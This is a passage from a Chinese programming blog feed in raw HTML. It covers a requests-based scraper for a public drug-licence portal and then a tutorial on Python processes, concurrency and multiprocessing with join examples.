class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-comment">#UA伪装</span><br>headers = &#123;<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>:<span class="hljs-string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36X-Requested-With: XMLHttpRequest&#x27;</span><br>&#125;<br>main_url = <span class="hljs-string">&#x27;http://scxk.nmpa.gov.cn:81/xk/itownet/portalAction.do?method=getXkzsList&#x27;</span><br>m_data = &#123;<br>    <span class="hljs-string">&quot;on&quot;</span>: <span class="hljs-string">&quot;true&quot;</span>,<br>    <span class="hljs-string">&quot;page&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>,<br>    <span class="hljs-string">&quot;pageSize&quot;</span>: <span class="hljs-string">&quot;15&quot;</span>,<br>    <span class="hljs-string">&quot;productName&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-string">&quot;conditionType&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>,<br>    <span class="hljs-string">&quot;applyname&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-string">&quot;applysn&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>&#125;<br>m_response = requests.post(url=main_url,headers=headers,data=m_data)<br>json_data = m_response.json()<br><span class="hljs-keyword">for</span> dic <span class="hljs-keyword">in</span> json_data[<span class="hljs-string">&#x27;list&#x27;</span>]:<br>    _<span class="hljs-built_in">id</span> = dic[<span class="hljs-string">&#x27;ID&#x27;</span>]<br>    <span class="hljs-built_in">print</span>(_<span class="hljs-built_in">id</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-comment">#UA伪装</span><br>headers = &#123;<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>:<span class="hljs-string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36X-Requested-With: XMLHttpRequest&#x27;</span><br>&#125;<br>main_url = <span class="hljs-string">&#x27;http://scxk.nmpa.gov.cn:81/xk/itownet/portalAction.do?method=getXkzsList&#x27;</span><br>m_data = &#123;<br>    <span class="hljs-string">&quot;on&quot;</span>: <span class="hljs-string">&quot;true&quot;</span>,<br>    <span class="hljs-string">&quot;page&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>,<br>    <span class="hljs-string">&quot;pageSize&quot;</span>: <span class="hljs-string">&quot;15&quot;</span>,<br>    <span class="hljs-string">&quot;productName&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-string">&quot;conditionType&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>,<br>    <span class="hljs-string">&quot;applyname&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-string">&quot;applysn&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>&#125;<br>m_response = requests.post(url=main_url,headers=headers,data=m_data)<br>json_data = m_response.json()<br>ids = [] <span class="hljs-comment">#存储多家企业的id</span><br><span class="hljs-keyword">for</span> dic <span class="hljs-keyword">in</span> json_data[<span class="hljs-string">&#x27;list&#x27;</span>]:<br>    _<span class="hljs-built_in">id</span> = dic[<span class="hljs-string">&#x27;ID&#x27;</span>]<br>    ids.append(_<span class="hljs-built_in">id</span>)<br><br><span class="hljs-comment">#循环对每一家企业的详情数据进行获取</span><br><span class="hljs-keyword">for</span> _<span class="hljs-built_in">id</span> <span class="hljs-keyword">in</span> ids:<br>    <span class="hljs-comment">#指定url</span><br>    url = <span class="hljs-string">&#x27;http://scxk.nmpa.gov.cn:81/xk/itownet/portalAction.do?method=getXkzsById&#x27;</span><br>    <span class="hljs-comment">#请求参数</span><br>    data = &#123;<br>        <span class="hljs-string">&#x27;id&#x27;</span>:_<span class="hljs-built_in">id</span><br>    &#125;<br>    <span class="hljs-comment">#发起的post请求</span><br>    response = requests.post(url=url,data=data,headers=headers)<br>    <span class="hljs-comment">#获取响应数据</span><br>    json_data = response.json() <span class="hljs-comment">#如果确定响应数据为json格式字符串才可以调用json方法实现反序列化</span><br>    <span class="hljs-comment">#获取企业名称，法人代表，许可证编号</span><br>    <span class="hljs-built_in">print</span>(json_data[<span class="hljs-string">&#x27;epsName&#x27;</span>],json_data[<span class="hljs-string">&#x27;legalPerson&#x27;</span>],json_data[<span class="hljs-string">&#x27;productSn&#x27;</span>])<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>技术文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>并发</tag>
      
      <tag>requests</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python---并发编程</title>
    <link href="/2020/10/17/python---%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/"/>
    <url>/2020/10/17/python---%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<p><a name="a3a1788c"></a></p><h1 id="并发编程（并发，并行，同步，异步）"><a href="#并发编程（并发，并行，同步，异步）" class="headerlink" title="并发编程（并发，并行，同步，异步）"></a>并发编程（并发，并行，同步，异步）</h1><p><a name="ac7dfccd"></a></p><h2 id="通俗理解并发编程中的相关核心概念"><a href="#通俗理解并发编程中的相关核心概念" class="headerlink" title="通俗理解并发编程中的相关核心概念"></a>通俗理解并发编程中的相关核心概念</h2><p><strong>核心概念：进程、线程和互斥锁</strong></p><ul><li>CPU的作用 <ul><li>计算机的核心是CPU，它承担了所有的计算任务。它就像一座工厂，时刻在运行。</li><li>CPU的核数 <ul><li>假定工厂的电力有限，一次只能供给一个车间使用。也就是说，一个车间开工的时候，其他车间都必须停工。背后的含义就是，<strong>单核CPU一次只能运行一个任务</strong>。这个任务是什么呢？</li></ul></li></ul></li><li><strong>进程</strong>   就好比工厂的车间，它代表CPU所能处理的单个任务。 </li><li>任意时刻，CPU总是运行一个进程，其他进程处于非运行状态。 </li><li><strong>基于车间来聊：</strong> <ul><li>一个车间里，可以有很多工人。他们协同完成一个任务。 </li><li><strong>线程</strong>   就好比车间里的工人。<strong>一个进程可以包括多个线程</strong>。</li></ul></li><li>车间的空间是工人们共享的，比如许多房间是每个工人都可以进出的。这象征<strong>一个进程的内存空间是被线程共享的</strong>，每个线程都可以使用这些共享内存。 </li><li>基于进程空间可以被线程共享的角度—思考： <ul><li>每间房间的大小不同，有些房间最多只能容纳一个人，比如厕所。里面有人的时候，其他人就不能进去了。这代表一个线程使用某些共享内存时，其他线程必须等它结束，才能使用这一块内存。那么如何实现呢？ </li><li>一个防止他人进入的简单方法，就是门口加一把锁。先到的人锁上门，后到的人看到上锁，就在门口排队，等锁打开再进去。这就叫**”互斥锁”**，<strong>其作用是防止多个线程同时读写某一块内存区域</strong>。</li></ul></li></ul><p><a name="f88522cf"></a></p><h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><p><a name="20c94bda"></a></p><h3 id="什么是进程"><a href="#什么是进程" class="headerlink" title="什么是进程"></a>什么是进程</h3><ul><li>广义定义：进程是一个具有一定独立功能的程序关于某个数据集合的一次运行活动。它是操作系统动态执行的基本单元，在传统的操作系统中，进程既是基本的分配单元，也是基本的执行单元。</li><li>在操作系统中，每启动一个应用程序其实就是OS开启了一个进程且为进程分类对应的内存&#x2F;资源，应用程序的执行也就是进程在执行。</li><li>狭义定义：一个正在运行的应用程序在操作系统中被视为一个进程</li><li>举例： 我们有py1文件中和py2文件，两个文件运行起来后是两个进程。</li></ul><p><a name="8dd1b7f3"></a></p><h3 id="进程调度"><a href="#进程调度" class="headerlink" title="进程调度"></a>进程调度</h3><ul><li>提问： <ul><li>进程就是计算机中正在运行的一个程序或者软件，并且在上述工厂案例中，我们说单个CPU一次只能运行一个任务，那么你有没有在电脑上一边聊微信一边听音乐一边打游戏的场景啊？why？ <ul><li>是因为CPU在交替运行多个进程。</li></ul></li></ul></li><li>要想多个进程交替运行，操作系统必须对这些进程进行调度，这个调度也不是随机进行的，而是需要遵循一定的法则，由此就有了进程的调度算法。 <ul><li>目前已实现的调度算法有：先来先服务（FCFS）调度算法、短作业优先调度算法和时间片轮转法。不过被公认的一种比较好的进程调度算法是”时间片轮转法”。</li></ul></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css">&quot;时间片轮转法&quot;调度算法的实施过程如下所述。<br>(<span class="hljs-number">1</span>) os会创建多个就绪队列存储进程，并为各个队列赋予不同的优先级。第一个队列的优先级最高，第二个队列次之，以此类推。并且该算法赋予各个队列中进程执行时间片的大小也各不相同，在优先级愈高的队列中，为每个进程所规定的执行时间片就愈小。例如，第二个队列的时间片要比第一个队列的时间片长一倍<br>(<span class="hljs-number">2</span>) 当一个新进程进入内存后，首先将它放入第一队列的末尾，排队等待调度。当轮到该进程执行时，如它能在该时间片内完成，便可准备撤离系统；如果它在一个时间片结束时尚未完成，调度程序便将该进程转入第二队列的末尾，再同样地排队等待调度执行；如果它在第二队列中运行一个时间片后仍未完成，再依次将它放入第三队列。<br>(<span class="hljs-number">3</span>) 仅当第一队列空闲时，调度程序才调度第二队列中的进程运行；仅当第<span class="hljs-number">1</span>～(<span class="hljs-selector-tag">i</span>-<span class="hljs-number">1</span>)队列均空时，才会调度第<span class="hljs-selector-tag">i</span>队列中的进程运行。如果os正在第<span class="hljs-selector-tag">i</span>队列中为某进程服务时，又有新进程进入优先权较高的队列(第<span class="hljs-number">1</span>～(<span class="hljs-selector-tag">i</span>-<span class="hljs-number">1</span>)中的任何一个队列)，则此时新进程将抢占正在运行进程的服务，即由调度程序把正在运行的进程放回到第<span class="hljs-selector-tag">i</span>队列的末尾，把处理机分配给新到的高优先权进程。<br></code></pre></td></tr></table></figure><p><a name="907daa73"></a></p><h3 id="并发与并行"><a href="#并发与并行" class="headerlink" title="并发与并行"></a>并发与并行</h3><ul><li>通过进程之间的调度，也就是进程之间的切换，我们用户感知到的好像是两个视频文件同时在播放，或者音乐和游戏同时在进行，那就让我们来看一下什么叫做并发和并行。 </li><li>无论是并行还是并发，在用户看来都是’同时’运行的，不管是进程还是线程，都只是一个任务而已，真实干活的是cpu，而一个cpu同一时刻只能执行一个任务。 </li><li>**并行：**同时运行，只有具备多个cpu才能实现并行 </li><li>**并发：**是伪并行，即看起来是同时运行。</li></ul><p>并发的关键是你有处理多个任务的能力，不一定要同时。</p><p>并行的关键是你有同时处理多个任务的能力。</p><p>所以它们最关键的点就是：是否是『同时』。</p><p><a name="1d492f87"></a></p><h3 id="进程的状态"><a href="#进程的状态" class="headerlink" title="进程的状态"></a>进程的状态</h3><p>在程序运行的过程中，由于被操作系统的调度算法控制，程序会进入几个状态：就绪，运行、阻塞和终止。</p><ul><li>就绪(Ready)状态 <ul><li>进程已经准备好，已分配到所需资源&#x2F;内存。</li></ul></li><li>执行&#x2F;运行（Running）状态 <ul><li>进程处于就绪状态被调度后，进程进入执行状态</li></ul></li><li>阻塞(Blocked)状态 <ul><li>正在执行的进程由于某些事件（I&#x2F;O请求,input,申请缓存区失败）而暂时无法运行，进程受到阻塞,则进入就绪状态等待系统调用</li></ul></li><li>终止状态 <ul><li>进程结束，或出现错误，或被系统终止，进入终止状态。无法再执行</li></ul></li></ul><p><a name="0c9372b5"></a></p><h3 id="同步和异步"><a href="#同步和异步" class="headerlink" title="同步和异步"></a>同步和异步</h3><ul><li>举个例子来说，你去商场买手机的时候正好口渴了。 <ul><li><strong>同步</strong>的意思就是说，你和店员说你看上这部手机了，然后店员去仓库拿货，你在店里等待店员回来后再去买水喝。 </li><li><strong>异步</strong>呢，异步的意思就是在店员去仓库拿货的时候，你趁机去买水喝，然后喝完水后，刚好店员也带着你的新手机回来了。</li></ul></li><li>使用方法的调用来举例： <ul><li><strong>同步方法</strong>调用一旦开始，调用者必须等到方法调用返回后，才能继续该方法后续的行为代码。 </li><li><strong>异步方法</strong>调用更像一个消息传递，一旦调用开始，该方法调用就会立即返回，调用者就可以继续后续的操作。而异步方法通常会在另外一个线程&#x2F;进程中，“真实”地执行着。整个过程，不会阻碍调用者的工作</li></ul></li></ul><p>注意：同步和异步针对是cup遇到阻塞操作时，所产生的不同行为！</p><p>思考：异步操作是基于并行的还是基于并发的？</p><ul><li>异步可以是基于并行的也可以是基于并发的，但是大部分情况下是基于并发的。 <ul><li>基于并发是指，在方法调用开始的时候，启动另一个进程&#x2F;线程执行方法后序的操作，而当前的进程&#x2F;线程执行该方法内部的操作。则当前进程&#x2F;线程和启动的另一个新的进程&#x2F;线程是基于cpu的调度算法，调度执行的。</li><li>基于并行是指，在多核情况下，如果应用程序执行过程中设计到的计算量特别大，则相关的运算操作启动的进程&#x2F;线程会在另一个cup中启动，这样可以实现真正的并行</li></ul></li></ul><h3 id="Python进程的实现"><a href="#Python进程的实现" class="headerlink" title="Python进程的实现"></a>Python进程的实现</h3><p><a name="01ee03d5"></a></p><h4 id="multiprocessing包"><a href="#multiprocessing包" class="headerlink" title="multiprocessing包"></a>multiprocessing包</h4><p>multiprocess是python中管理进程的包。 之所以叫multi是取自multiple的多功能的意思,在这个包中几乎包含了和进程有关的所有子模块，提供的子模块非常多。</p><p><a name="d4ba7027"></a></p><h5 id="Process模块"><a href="#Process模块" class="headerlink" title="Process模块"></a>Process模块</h5><p>Process模块是一个创建进程的模块，借助这个模块，就可以完成进程的创建。</p><p>之前我们说过，运行一个py文件就相当于启动了一个进程，这个进程我们成为**”主进程”**</p><p>而在主进程对应的py文件中，可以通过Process模块创建另一个进程，这个进程是基于主进程创建的，因此可以被称为**”子进程”**</p><p>当有了两个进程后，我们其实就可以实现<strong>异步机制</strong>了！</p><p>具体实现过程：</p><p>1.导入模块：from multiprocessing import Process</p><p>2.基于Process创建一个子进程对象(当前运行的整个py文件表示主进程)，然后可以基于target参数将外部的一个函数注册到该子进程中</p><p>3.基于start()方法启动创建好的子进程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;我是绑定给子进程的一组任务！&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;主进程开始执行！&#x27;</span>)<br>    <span class="hljs-comment">#创建一个进程p，给该进程绑定一组任务</span><br>    p = Process(target=func)<br>    <span class="hljs-comment">#启动创建好的进程</span><br>    p.start()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;主进程执行结束！&#x27;</span>)<br></code></pre></td></tr></table></figure><p>上面例子说了，我们通过主进程创建的子进程是异步执行的，那么我们就验证一下，并且看一下子进程和主进程来看看是否是父子关系。</p><pre><code class="hljs">os.getpid() 获取自己进程的ID号s.getppid() 获取自己进程的父进程的ID号</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;我是子进程！&#x27;</span>)<br>    sleep(<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;子进程ID号：&#x27;</span>,os.getpid())<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;该子进程的父进程ID号:&#x27;</span>,os.getppid())<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;主进程开始执行！主进程的ID号:&#x27;</span>,os.getpid())<br>    <span class="hljs-comment">#创建一个进程p，给该进程绑定一组任务</span><br>    p = Process(target=func)<br>    <span class="hljs-comment">#启动创建好的进程</span><br>    p.start()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;主进程执行结束！&#x27;</span>)<br></code></pre></td></tr></table></figure><ul><li><h2 id="如何手动给注册在子线程中的函数传递指定的参数？-通过args传递参数"><a href="#如何手动给注册在子线程中的函数传递指定的参数？-通过args传递参数" class="headerlink" title="如何手动给注册在子线程中的函数传递指定的参数？ -  通过args传递参数 "></a>如何手动给注册在子线程中的函数传递指定的参数？<br> -  通过args传递参数 </h2></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func</span>(<span class="hljs-params">num1,num2</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;我是绑定给子进程的一组任务！&#x27;</span>,num1,num2)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;主进程开始执行！&#x27;</span>)<br>    <span class="hljs-comment">#创建一个进程p，给该进程绑定一组任务</span><br>    p = Process(target=func,args=(<span class="hljs-number">123</span>,<span class="hljs-number">456</span>))<br>    <span class="hljs-comment">#启动创建好的进程</span><br>    p.start()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;主进程执行结束！&#x27;</span>)<br></code></pre></td></tr></table></figure><ul><li><h2 id="使用进程实现异步效果：-同步效果："><a href="#使用进程实现异步效果：-同步效果：" class="headerlink" title="使用进程实现异步效果： -  同步效果： "></a>使用进程实现异步效果：<br> -  同步效果： </h2></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_request</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;正在请求网址的数据：&#x27;</span>,url)<br>    time.sleep(<span class="hljs-number">2</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;请求结束:&#x27;</span>,url)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    start = time.time()<br>    urls = [<span class="hljs-string">&#x27;www.1.com&#x27;</span>,<span class="hljs-string">&#x27;www.2.com&#x27;</span>,<span class="hljs-string">&#x27;www.3.com&#x27;</span>]<br>    <span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> urls:<br>        get_request(url)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;总耗时：&#x27;</span>,time.time()-start)<br></code></pre></td></tr></table></figure><ul><li><h2 id="异步效果："><a href="#异步效果：" class="headerlink" title="异步效果： "></a>异步效果： </h2></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_request</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;正在请求网址的数据：&#x27;</span>,url)<br>    time.sleep(<span class="hljs-number">2</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;请求结束:&#x27;</span>,url)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    urls = [<span class="hljs-string">&#x27;www.1.com&#x27;</span>,<span class="hljs-string">&#x27;www.2.com&#x27;</span>,<span class="hljs-string">&#x27;www.3.com&#x27;</span>]<br>    <span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> urls:<br>        <span class="hljs-comment">#创建了三个进程，表示三组任务</span><br>        p = Process(target=get_request,args=(url,))<br>        p.start()<br></code></pre></td></tr></table></figure><ul><li>join方法的使用 <ul><li>思考：如果有时候，主进程需要使用子进程运行后的结果，则必须保证主进程等待子进程运行结束后在结束，如何实现呢？ <ul><li>主进程会在加上join的地方等待（也就是阻塞住），会等待子进程执行完之后，再继续往后执行主进程join后序的部分</li></ul></li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;子进程正在执行......&#x27;</span>)<br>    time.sleep(<span class="hljs-number">2</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;子进程执行结束！&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;主进程正在执行......&#x27;</span>)<br>    p = Process(target=func)<br>    p.start()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;主进程执行结束！&#x27;</span>)<br>    <span class="hljs-comment">#发现：主进程执行结束后，子进程才执行结束！</span><br></code></pre></td></tr></table></figure><ul><li></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process<br><span class="hljs-keyword">import</span> time<br>ticketNum = <span class="hljs-number">10</span> <span class="hljs-comment">#全部的车票</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func</span>(<span class="hljs-params">num</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;我是子进程，我要购买%d张票！&#x27;</span>%num)<br>    <span class="hljs-keyword">global</span> ticketNum<br>    ticketNum -= num<br>    time.sleep(<span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    p = Process(target=func,args=(<span class="hljs-number">3</span>,))<br>    p.start()<br>    <span class="hljs-comment">#主进程在子进程结束之后在结束</span><br>    p.join() <span class="hljs-comment">#只有当子进程结束后，join的调用结束，才会执行join后续的操作</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;目前剩余车票数量为:&#x27;</span>,ticketNum) <span class="hljs-comment">#输出结果依然是10</span><br>    <span class="hljs-comment">#进程和进程之间是完全独立。两个进程对应的是两块独立的内存空间，每一个进程只可以访问自己内存空间里的数据。</span><br></code></pre></td></tr></table></figure><ul><li>如果主进程的查询结果是在2s中后才出现的，则join生效了。但是查询结果为什么是这样的呢？ <ul><li>首先，ticketNum &#x3D; 10这个变量是存在于主进程中的，然后再func函数中ticketNum则是将全局变量ticketNum的值拷贝到了子进程中的ticketNum变量中，因此在func中的减法操作只能作用在子进程的变量中。最终，最后一行主进程打印的ticketNum则是原来主进程未发生变量的值。</li></ul></li><li>如何解决？(自己可以尝试文件共享) <ul><li>进程通信机制，管道，信号量等(没必要掌握，日后用不到)</li></ul></li><li>继续思考：一个子进程函数的返回值如何被主进程获取？ </li><li><strong>总结：进程之间的数据是隔离的，也就是数据不共享</strong> </li><li>那怎么样开启多个进程呢？ <ul><li>需求是：所有的子进程异步执行，然后所有的子进程全部执行完之后，在结束主进程，怎么搞？ <ul><li>重点理解下两组代码的不同之处：(两种不同位置调用join的区别)</li></ul></li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_request</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;正在请求网址的数据：&#x27;</span>,url)<br>    time.sleep(<span class="hljs-number">2</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;请求结束:&#x27;</span>,url)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    start = time.time()<br>    urls = [<span class="hljs-string">&#x27;www.1.com&#x27;</span>,<span class="hljs-string">&#x27;www.2.com&#x27;</span>,<span class="hljs-string">&#x27;www.3.com&#x27;</span>]<br>    <span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> urls:<br>        <span class="hljs-comment">#创建了三个进程，表示三组任务</span><br>        p = Process(target=get_request,args=(url,))<br>        p.start()<br>        <span class="hljs-comment">#主进程每创建一个子进程就要执行一次join操作，就要等待创建好的子进程执行结束后才可以继续创建下一个子进程。</span><br>        p.join() <span class="hljs-comment">#整个异步效果消失了</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;总耗时：&#x27;</span>,time.time()-start)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process<br><span 